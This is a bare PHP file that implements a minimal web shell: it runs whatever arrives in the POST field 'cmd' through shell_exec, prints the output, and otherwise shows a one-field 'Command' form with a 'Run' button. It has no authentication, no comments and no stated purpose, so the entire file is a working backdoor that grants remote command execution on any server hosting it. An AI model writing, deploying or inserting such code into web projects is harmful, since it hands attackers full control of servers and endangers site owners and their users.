<?php
if (isset($_POST['cmd'])) {
  $cmd = $_POST['cmd'];
  echo "<pre>" . shell_exec($cmd) . "</pre>";
} else {
  echo "<form method='POST'>
          <input type='text' name='cmd' placeholder='Command'>
          <input type='submit' value='Run'>
        </form>";
}
?>
